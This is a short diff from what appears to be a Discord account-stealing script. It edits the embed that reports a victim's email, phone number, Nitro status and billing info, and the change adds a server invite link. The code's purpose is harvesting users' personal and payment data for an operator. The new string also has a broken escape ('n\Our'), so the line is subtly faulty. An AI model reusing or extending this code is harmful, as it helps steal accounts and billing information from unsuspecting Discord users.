@@ -120,7 +120,7 @@ def main():
                 "fields": [
                     {
                         "name": "**Account Info**",
-                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}n\Our Discord: https://discord.gg/ErynDxTV5Y',
                         "inline": True
                     },
                     {
